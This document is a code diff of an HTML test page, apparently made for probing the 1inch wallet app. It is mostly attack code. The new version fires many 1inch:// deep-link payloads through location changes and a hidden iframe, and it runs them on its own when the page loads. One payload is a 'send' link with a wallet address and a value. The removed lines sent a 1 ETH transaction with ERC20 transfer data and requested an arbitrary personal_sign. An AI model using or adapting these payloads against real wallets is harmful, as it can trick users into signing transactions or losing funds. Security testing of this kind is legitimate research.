@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch Deep Link & Scheme Test</title>
+    <title>1inch Deep Link Bypass Test</title>
     <style>
-        body { font-family: Arial; padding: 20px; background:#111; color:#0f0; }
-        button { padding:15px; margin:10px 0; width:100%; background:#c00; color:white; border:none; border-radius:8px; font-size:16px; }
-        pre { background:#1a1a2e; padding:15px; border-radius:8px; }
+        body { font-family: Arial; background: #000; color: #0f0; padding: 20px; }
+        button { padding: 18px; margin: 12px 0; width: 100%; font-size: 17px; background: #c00; color: white; border: none; border-radius: 10px; }
+        pre { background: #111; padding: 15px; border-radius: 8px; }
     </style>
 </head>
 <body>
-    <h1>🛡️ 1inch Wallet - Deep Link & Critical Test</h1>
+    <h1>🛠️ Deep Link Bypass Test - 1inch Wallet</h1>
+    <p>Host: <strong>https://0x403for.github.io</strong></p>
 
-    <button onclick="testDeepLinks()">1. Test Berbagai Deep Link Schemes</button>
-    <button onclick="testMaliciousTx()">2. Malicious Tx Parameter</button>
-    <button onclick="testRawSign()">3. Raw Personal Sign + Typed Data</button>
-    <button onclick="testNavigation()">4. Navigation Hijack Test</button>
-    <button onclick="clearLog()">Clear Log</button>
+    <button onclick="testAllSchemes()">🔥 Test Semua Deep Link Variants</button>
+    <button onclick="testDirectScheme()">Direct 1inch:// Scheme</button>
+    <button onclick="testLocationReplace()">location.replace + Scheme</button>
+    <button onclick="testIframeScheme()">Iframe Scheme Test</button>
 
     <h2>Log</h2>
     <pre id="log"></pre>
@@ -25,68 +25,59 @@
     <script>
         const logEl = document.getElementById('log');
 
-        function log(msg, error=false) {
-            const t = new Date().toLocaleTimeString();
-            logEl.innerHTML += `<span style="color:${error?'#ff5555':'#55ff99'}">[${t}] ${msg}</span><br>`;
+        function log(msg, error = false) {
+            const time = new Date().toLocaleTimeString();
+            logEl.innerHTML += `<span style="color:${error ? '#ff6666' : '#66ff99'}">[${time}] ${msg}</span><br>`;
             console.log(msg);
         }
 
-        function testDeepLinks() {
-            const schemes = [
-                "1inch://", 
-                "1inch://connect", 
-                "1inch://sign", 
-                "1inch://walletconnect", 
-                "1inch://send?to=0xDDf9d60E588aCe13307aC1828d7DE211B4Ef949A&amount=0.1",
+        function testAllSchemes() {
+            const payloads = [
+                "1inch://",
+                "1inch://connect",
+                "1inch://sign?data=test",
+                "1inch://walletconnect",
+                "1inch://send?to=0xDDf9d60E588aCe13307aC1828d7DE211B4Ef949A&value=100000000000000000",
+                "1inch://bypass",
+                "1inch://test",
+                "//1inch://bypass",
                 "https://0x403for.github.io/1inch://bypass"
             ];
 
-            schemes.forEach(scheme => {
-                log(`Mencoba scheme: ${scheme}`);
-                window.location.href = scheme;
+            payloads.forEach(p => {
+                log(`Mencoba: ${p}`);
+                try {
+                    window.location.href = p;
+                } catch(e) {}
+                try {
+                    window.location.replace(p);
+                } catch(e) {}
             });
         }
 
-        async function testMaliciousTx() {
-            try {
-                const accounts = await ethereum.request({method: 'eth_accounts'});
-                const tx = {
-                    from: accounts[0],
-                    to: "0x000000000000000000000000000000000000dead", // address mencurigakan
-                    value: "0x0de0b6b3a7640000", // 1 ETH (ubah sesuai test)
-                    data: "0xa9059cbb000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef0000000000000000000000000000000000000000000000000de0b6b3a7640000" // ERC20 transfer
-                };
-                log("Mengirim malicious-looking TX...");
-                await ethereum.request({method: 'eth_sendTransaction', params: [tx]});
-            } catch(e) {
-                log("TX Result: " + e.message, true);
-            }
+        function testDirectScheme() {
+            log("Direct scheme test...");
+            window.location = "1inch://bypass";
         }
 
-        async function testRawSign() {
-            try {
-                const msg = "0x" + Array.from("Malicious test message", c => c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
-                const sig = await ethereum.request({
-                    method: 'personal_sign',
-                    params: [msg, (await ethereum.request({method:'eth_accounts'}))[0]]
-                });
-                log("Raw sign berhasil: " + sig.slice(0,30) + "...");
-            } catch(e) { log(e.message, true); }
+        function testLocationReplace() {
+            log("location.replace test...");
+            window.location.replace("1inch://test");
         }
 
-        function testNavigation() {
-            log("Navigation hijack test...");
-            // Coba redirect + history manipulation
-            history.pushState({}, "", "/fake-dapp");
-            window.open("1inch://test", "_self");
+        function testIframeScheme() {
+            log("Iframe deep link test...");
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = "1inch://bypass";
+            document.body.appendChild(iframe);
         }
 
-        function clearLog() {
-            logEl.innerHTML = "";
-        }
-
-        // Auto init
-        if (window.ethereum) log("✅ Ethereum provider ready");
+        // Auto test on load
+        setTimeout(() => {
+            log("Test otomatis dijalankan...");
+            testAllSchemes();
+        }, 1500);
     </script>
 </body>
 </html>
